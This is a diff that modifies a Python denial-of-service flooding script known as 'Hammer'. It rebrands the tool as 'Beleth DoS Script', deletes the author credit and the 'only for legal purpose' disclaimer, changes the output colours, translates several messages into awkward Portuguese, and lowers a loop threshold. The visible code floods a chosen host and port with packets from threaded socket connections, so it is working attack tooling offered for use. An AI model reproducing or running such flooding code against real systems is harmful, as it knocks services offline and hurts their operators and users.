@@ -1,9 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Hammer Dos Script 
-# by Can Yalçın
-# only for legal purpose
+# python 3.3.2+ Beleth DoS Script Alpha 0.1
 
 
 from queue import Queue
@@ -49,14 +47,14 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[31m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
-		#print("\033[91m",e,"\033[0m")
+		print("\033[31mno conexão! server talvez esteja baixo\033[0m")
+		#print("\033[31m",e,"\033[0m")
 		time.sleep(.1)
 
 
@@ -153,7 +151,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[31mcheque o IP do server e a port\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
@@ -167,7 +165,7 @@ if __name__ == '__main__':
 		#tasking
 		item = 0
 		while True:
-			if (item>1800): # for no memory crash
+			if (item>180): # crash por não memória
 				item=0
 				time.sleep(.1)
 			item = item + 1
